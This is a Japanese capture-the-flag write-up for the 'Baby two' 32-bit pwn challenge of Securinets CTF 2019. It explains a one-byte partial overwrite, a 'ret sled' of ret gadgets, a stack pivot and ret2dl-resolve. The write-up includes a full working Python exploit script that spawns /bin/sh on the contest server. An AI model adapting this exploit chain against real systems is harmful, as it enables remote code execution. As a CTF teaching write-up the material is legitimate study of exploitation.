# [pwn 1000pts] Baby two - Securinets CTF 2019 Quals
32ビットバイナリです．
というか最初は64ビットだったのですが競技中に32ビットに変えられました．
さらに運営が単にm32をつけてコンパイルし直しただけなので想定解で解けるかチェックされておらず，想定より難しい問題となってしまったそうです．
libcは配布されていませんが，競技中はBaby oneと同じlibcを使ったら解けました．
```
$ checksec baby1
[*] 'baby1'
    Arch:	64 bits (little endian)
    NX:		NX enabled
    SSP:	SSP disabled (No canary found)
    RELRO:	Partial RELRO
    PIE:	PIE disabled
```
内容はbaby oneとほとんど同じですが，writeがなくなっています．
そのため出力用の関数がなく，libcのアドレスをリークすることができません．
状況的にはlibcのバージョンが特定できない状況と同じなので，ret2dl-resolveが使えます．
この手法は，libc(ld-linux)がGOTに載せる関数のアドレスを解決する際に使われる関数を使って，system関数のアドレスを解決させ，そのまま呼び出す手法です．
詳しくはここでは説明しませんが，一回書けば他の問題にもすぐに再利用できます．

これで万事解決と思いたいのですが，mainの最後は次のようになっています．
```nasm
...
call    _read
add     esp, 10h
nop
mov     ecx, [ebp+var_4]
leave
lea     esp, [ecx-4]
retn
```
リターンアドレスのあるポインタを指したデータがあるスタックのアドレスがecxに入るので，これを正しいアドレスにしないといけません．
このアドレスの先にあるデータがリターンアドレスとして解釈されるのです．
32bitなのでスタックアドレスを総当りしても良いと思いますが，競技中にもう少し効率的な方法を思いつきました．

`var_4`はバッファの先にあるので，これを部分的にオーバーフローさせることができます．
したがって，`var_4`の下位1バイトを書き換え，バッファのアドレスを指してやります．
バッファは0x2Cバイトあるのでスタックアドレスを特定するよりも遥かに高い確率で当たります．
バッファの最初の方をretだけのガジェットで埋めておき，最後にROPコードをreadしてスタックピボットするROPを入れておけば，高い確率で次のROPへ移ることができます．
一度Stage 2のROPが実行できれば，あとは適当にret2dl-resolveをするだけです．

スタックの状態は次のようになります．
```
         |         |
but ---> |  &ret   |
         |  &ret   |
         |  &ret   |
buf+? -> |  &ret   |
         |  &ret   |
            ...
         |ROP chain|
         |  buf+?  |
             ...
         | retaddr |
         |         |
```
こういう手法って今までにあるのかな？
私は勝手にret sledと呼んでいます．

あとは何段階かに分けてret2dl-resolveを実行しましょう．
```python
from ptrlib import *
import time

elf = ELF("./baby2")

addr_plt = 0x08048320
addr_start = elf.symbol("_start")

addr_relplt = elf.section(".rel.plt")
addr_dynsym = elf.section(".dynsym")
addr_dynstr = elf.section(".dynstr")
addr_bss    = elf.section(".bss")

rop_pop3 = 0x08048509
rop_ret = 0x080482fa

fname = "system\x00"
farg  = "/bin/sh\x00"

plt_read = 0x08048330
base_stage = addr_bss + 0x800
addr_reloc = addr_bss + 0xa00
addr_sym   = addr_bss + 0xa80 | (addr_dynsym & 0xF)
addr_str   = addr_bss + 8
addr_arg   = addr_str + len(fname)

# Elf32_Rel
reloc = p32(elf.got('setvbuf'))
reloc += p32((((addr_sym - addr_dynsym) // 0x10) << 8) | 7)
# Elf32_Sym
sym = p32(addr_str - addr_dynstr)
sym += p32(0)
sym += p32(0)
sym += p32(0x12)

def craft_read(addr, size):
    payload = p32(plt_read)
    payload += p32(rop_pop3)
    payload += p32(0)    # fd
    payload += p32(addr) # buf
    payload += p32(size) # size
    return payload

#sock = Socket("127.0.0.1", 4001)
sock = Socket("51.254.114.246", 2222)

""" Stage 1 (probabilistic write) """
payload1 = b''
payload1 += p32(rop_ret) * ((0x2c - 6 * 4) // 4)
payload1 += craft_read(base_stage, 0x100) # 5 * 4
payload1 += p32(addr_start)               # 4
payload1 += bytes([0x20])

""" Stage 2 (stack pivot) """
payload2 = b'A' * 0x2c
payload2 += p32(base_stage + 4)
payload2 += b'\x00' * (0x12c - len(payload2))

""" Stage 3 (craft) """
reloc_offset = addr_reloc - addr_relplt

payload3 = b''
payload3 += craft_read(addr_reloc, 0x8)
payload3 += craft_read(addr_sym, 0x10)
payload3 += craft_read(addr_str, len(fname))
payload3 += craft_read(addr_arg, len(farg))
payload3 += p32(addr_plt)
payload3 += p32(reloc_offset)
payload3 += b"XXXX"
payload3 += p32(addr_arg)
payload3 += b"\x00" * (0x100 - len(payload3))

# Stage 1
sock.send(payload1)
time.sleep(0.5)
sock.send(payload3)

# Stage 2
sock.send(payload2)

# Stage 3
sock.send(reloc)
sock.send(sym)
sock.send(fname)
sock.send(farg)

sock.interactive()
```

# 感想
競技中も運営のミスだということは気づいていたので「早くなおせよー」ってなっていましたが，解けてしまったので結局最後まで修正は入りませんでした．
競技中，この方法に気づいた後にexploitコードを書いたら一発で通ったので焦りました．
